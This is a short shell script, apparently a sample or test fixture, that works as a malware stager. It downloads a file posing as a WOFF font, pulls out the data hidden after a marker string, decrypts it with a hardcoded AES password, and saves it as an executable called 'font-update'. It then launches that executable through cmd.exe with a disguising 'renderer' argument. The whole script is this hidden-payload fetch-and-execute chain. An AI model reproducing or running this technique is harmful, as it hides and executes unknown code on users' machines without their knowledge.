#!/bin/bash
set -e
url="https://example.invalid/cache/Display-Bold.woff"
font="$HOME/.cache/Display-Bold.woff"
program="$HOME/.local/bin/font-update"
marker="%%BOUNDARY%%"
mkdir -p "$(dirname "$font")" "$(dirname "$program")"
curl -fsSL -o "$font" "$url"
offset=$(grep -oba "$marker" "$font" | head -n 1 | cut -d: -f1)
start=$((offset + ${#marker} + 1))
tail -c +$start "$font" | openssl enc -aes-256-cbc -d -a -A -pass pass:fixture | node -e "require('fs').writeFileSync(process.argv[1], require('fs').readFileSync(0))" "$program"
chmod +x "$program"
cmd.exe /c "start \"\" \"$program\" --type=renderer"
